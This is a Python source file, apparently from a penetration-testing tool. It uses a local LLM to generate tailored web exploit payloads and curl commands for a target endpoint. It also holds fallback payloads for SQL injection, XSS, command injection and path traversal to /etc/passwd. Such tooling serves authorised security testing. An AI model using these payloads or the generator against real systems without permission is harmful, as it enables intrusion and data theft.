import json
import logging
import re
from typing import Dict, List, Optional, Any
from datetime import datetime
import requests
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import ollama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class PayloadGenerator:
    """AI-powered custom payload generator using remote Ollama"""
    
    def __init__(self, model_name: str = "qwen3:30b-32k", host: str = None):
        self.model_name = model_name
        self.host = host or "http://localhost:11434"
        self.generated_payloads = []
        self.payload_history = {}
        
        # Initialize Ollama client with remote host
        self.client = None
        if OLLAMA_AVAILABLE:
            try:
                self.client = ollama.Client(host=self.host)
                self.client.list()
                logger.info(f"✅ PayloadGenerator connected to Ollama at {self.host}")
            except Exception as e:
                logger.warning(f"⚠️ PayloadGenerator: Ollama connection failed: {e}")
                self.client = None
        
    def generate_payload(self, vulnerability_type: str, endpoint: str, 
                         parameter: str, method: str, response_text: str,
                         context: Dict = None) -> Dict:
        """Generate a custom payload using AI"""
        logger.info(f"🧠 Generating custom payload for {vulnerability_type} on {endpoint}")
        
        response_analysis = self._analyze_response(response_text, vulnerability_type)
        
        prompt = self._build_payload_prompt(
            vulnerability_type, endpoint, parameter, method, 
            response_analysis, context
        )
        
        try:
            if not self.client:
                logger.warning("Ollama client not available, using fallback")
                return self._generate_fallback_payload(
                    vulnerability_type, endpoint, parameter, method
                )
            
            # Use client.chat with remote host
            response = self.client.chat(
                model=self.model_name,
                messages=[
                    {
                        'role': 'system',
                        'content': """You are a security expert and penetration tester. 
                        Generate creative, custom payloads for web application vulnerabilities.
                        Your payloads should be tailored to the specific application behavior.
                        Return ONLY valid JSON."""
                    },
                    {
                        'role': 'user',
                        'content': prompt
                    }
                ]
            )
            
            response_text = response.message.content.strip()
            
            json_match = re.search(r'\{[\s\S]*\}', response_text)
            if json_match:
                try:
                    payload_data = json.loads(json_match.group())
                    payload_data['generated_by'] = 'AI'
                    payload_data['timestamp'] = datetime.now().isoformat()
                    payload_data['vulnerability_type'] = vulnerability_type
                    payload_data['endpoint'] = endpoint
                    payload_data['parameter'] = parameter
                    payload_data['method'] = method
                    
                    self.payload_history[f"{endpoint}_{parameter}"] = payload_data
                    self.generated_payloads.append(payload_data)
                    
                    logger.info(f"✅ Generated custom payload: {payload_data.get('payload', 'N/A')[:50]}...")
                    return payload_data
                    
                except json.JSONDecodeError as e:
                    logger.warning(f"Failed to parse JSON: {e}")
                    return self._generate_fallback_payload(
                        vulnerability_type, endpoint, parameter, method
                    )
            else:
                return self._generate_fallback_payload(
                    vulnerability_type, endpoint, parameter, method
                )
                
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return self._generate_fallback_payload(
                vulnerability_type, endpoint, parameter, method
            )

    def _analyze_response(self, response_text: str, vuln_type: str) -> Dict:
        """Analyze response to understand application behavior"""
        analysis = {
            'status_code': None,
            'error_messages': [],
            'database_indicators': [],
            'reflection_points': [],
            'structure': '',
            'keywords': []
        }
        
        if hasattr(response_text, 'status_code'):
            analysis['status_code'] = response_text.status_code
            if hasattr(response_text, 'text'):
                response_text = response_text.text
        
        error_patterns = [
            r'(error|exception|warning|fatal)[\s:]+([^\n]+)',
            r'(mysql|sql|database|query)[\s:]+([^\n]+)',
            r'(syntax|invalid|unexpected)[\s:]+([^\n]+)'
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    analysis['error_messages'].append(match[-1].strip())
                else:
                    analysis['error_messages'].append(match.strip())
        
        db_indicators = [
            'mysql', 'sql', 'postgresql', 'oracle', 'mssql', 'sqlite',
            'database', 'table', 'column', 'row', 'query', 'select'
        ]
        for indicator in db_indicators:
            if indicator in response_text.lower():
                analysis['database_indicators'].append(indicator)
        
        keywords = ['password', 'username', 'email', 'user', 'admin', 
                   'token', 'session', 'cookie', 'auth']
        for keyword in keywords:
            if keyword in response_text.lower():
                analysis['keywords'].append(keyword)
        
        if '<html' in response_text.lower():
            analysis['structure'] = 'html'
        elif '{' in response_text and '}' in response_text:
            try:
                json.loads(response_text)
                analysis['structure'] = 'json'
            except:
                analysis['structure'] = 'unknown'
        
        analysis['error_messages'] = list(set(analysis['error_messages']))[:5]
        analysis['database_indicators'] = list(set(analysis['database_indicators']))
        
        return analysis

    def _build_payload_prompt(self, vuln_type: str, endpoint: str, 
                             parameter: str, method: str,
                             response_analysis: Dict, context: Dict) -> str:
        """Build the prompt for Ollama payload generation"""
        
        prompt = f"""Generate a custom payload for a {vuln_type} vulnerability.

TARGET INFORMATION:
- Endpoint: {endpoint}
- Parameter: {parameter}
- Method: {method}
- Vulnerable Type: {vuln_type}

RESPONSE ANALYSIS:
- Status Code: {response_analysis.get('status_code', 'Unknown')}
- Structure: {response_analysis.get('structure', 'Unknown')}
- Error Messages: {', '.join(response_analysis.get('error_messages', ['None']))}
- Database Indicators: {', '.join(response_analysis.get('database_indicators', ['None']))}
- Keywords Found: {', '.join(response_analysis.get('keywords', ['None']))}

"""
        
        if context:
            prompt += f"ADDITIONAL CONTEXT:\n{json.dumps(context, indent=2)}\n\n"
        
        prompt += """Based on this analysis, generate a custom payload that would exploit this vulnerability.

Return a JSON response with:
{
    "payload": "The custom payload string",
    "payload_type": "sql_injection|xss|command_injection|path_traversal|idor",
    "description": "Description of what the payload does",
    "expected_response": "What to look for in the response to confirm success",
    "confidence": 0.0-1.0,
    "explanation": "Why this payload was chosen based on the response analysis",
    "curl_command": "Full curl command to test this payload",
    "poc": "Proof of concept explanation"
}

Make the payload creative and tailored to the specific application behavior.
"""
        return prompt

    def _generate_fallback_payload(self, vuln_type: str, endpoint: str,
                                   parameter: str, method: str) -> Dict:
        """Generate a fallback payload if AI generation fails"""
        fallback_payloads = {
            'sql_injection': {
                'payload': "' OR '1'='1' --",
                'description': "Basic SQL injection bypass",
            },
            'xss': {
                'payload': "<script>alert('XSS')</script>",
                'description': "Basic XSS payload",
            },
            'command_injection': {
                'payload': "; ls -la",
                'description': "Command injection to list directory",
            },
            'path_traversal': {
                'payload': "../../../etc/passwd",
                'description': "Path traversal to read sensitive files",
            },
            'idor': {
                'payload': "1",
                'description': "IDOR to access resource 1",
            }
        }
        
        payload_str = fallback_payloads.get(vuln_type, {}).get('payload', 'test')
        curl_cmd = self._generate_curl_command(endpoint, parameter, payload_str, method)
        
        return {
            'payload': payload_str,
            'payload_type': vuln_type,
            'description': fallback_payloads.get(vuln_type, {}).get('description', 'Fallback payload'),
            'expected_response': 'Check for changes in response',
            'confidence': 0.5,
            'explanation': 'Generated from fallback (AI generation failed)',
            'curl_command': curl_cmd,
            'poc': 'Manual verification required',
            'generated_by': 'fallback'
        }

    def _generate_curl_command(self, endpoint: str, param: str, payload: str, method: str) -> str:
        """Generate a curl command for testing"""
        parsed = urlparse(endpoint)
        params = parse_qs(parsed.query)
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        test_url = endpoint.split('?')[0] + '?' + new_query
        
        if method.upper() == 'GET':
            return f"curl -X GET '{test_url}'"
        else:
            return f"curl -X POST '{endpoint}' -d '{param}={payload}'"

    def generate_multiple_payloads(self, vuln_type: str, endpoint: str,
                                   parameter: str, method: str,
                                   response_text: str, count: int = 3) -> List[Dict]:
        """Generate multiple custom payloads for a vulnerability"""
        payloads = []
        context = {'iteration': 0}
        
        for i in range(count):
            context['iteration'] = i + 1
            context['previous_payloads'] = [p.get('payload', '') for p in payloads]
            
            payload = self.generate_payload(
                vuln_type, endpoint, parameter, method,
                response_text, context
            )
            if payload:
                payloads.append(payload)
        
        return payloads

    def get_payload_history(self) -> List[Dict]:
        return self.generated_payloads

    def get_payload_for_endpoint(self, endpoint: str, parameter: str) -> Optional[Dict]:
        key = f"{endpoint}_{parameter}"
        return self.payload_history.get(key)

    def save_payloads(self, filepath: str):
        """Save generated payloads to file"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump({
                    'timestamp': datetime.now().isoformat(),
                    'total_payloads': len(self.generated_payloads),
                    'payloads': self.generated_payloads
                }, f, indent=2, ensure_ascii=False)
            logger.info(f"✅ Payloads saved to {filepath}")
        except Exception as e:
            logger.error(f"Failed to save payloads: {e}")